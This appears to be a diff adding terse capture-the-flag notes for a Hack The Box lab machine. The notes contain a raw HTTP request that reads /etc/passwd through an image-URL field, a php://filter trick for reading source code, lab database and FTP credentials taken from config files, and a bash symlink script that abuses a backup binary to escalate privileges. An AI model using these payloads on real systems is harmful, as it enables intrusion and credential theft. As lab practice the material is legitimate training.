@@ -1,0 +1,52 @@
+> scan and enum services.
+> found backup sub-domain.
+> found /dev/ in backup.forwardslash.htb
+> regiest and login.
+> enum...
+> do malicious request with burp
+----------------------------------------------------------------------------------------
+POST /profilepicture.php HTTP/1.1
+Host: backup.forwardslash.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+Origin: http://backup.forwardslash.htb
+Connection: close
+Referer: http://backup.forwardslash.htb/profilepicture.php
+Cookie: PHPSESSID=mppuarvu4qemlp5aal3estc508
+Upgrade-Insecure-Requests: 1
+
+url=/etc/passwd
+--------------------------------------------------------------------------------------
+(Should correct user-agent,cookie)
+
+> back to scraping dir on backup.forwardslash.htb,found 2 new php extensions.
+	+ config.php
+	+ api.php
+
+> read both file,found a credential.
+--------------------------------------------------------------------------------------------------------
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'www-data');
+define('DB_PASSWORD', '5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec');
+--------------------------------------------------------------------------------------------------------
+
+> simple trick to read /dev/index.php => php://filter/convert.base64-encode/resource=dev/index.php => found another cred.
+---------------------------------------------------------
+if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/'))
+---------------------------------------------------------
+
+> enum get interesting binary /usr/bin/backup => exploit
+
+----------------------------------------------------------
+#!/bin/bash
+i=$(backup | grep ERROR |  awk '{print $2}');
+ln -s /var/backups/config.php.bak /tmp/.lol/$i;
+backup;
+----------------------------------------------------------
+
+> password for pain:db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704
+> manual decrypt ciphertext
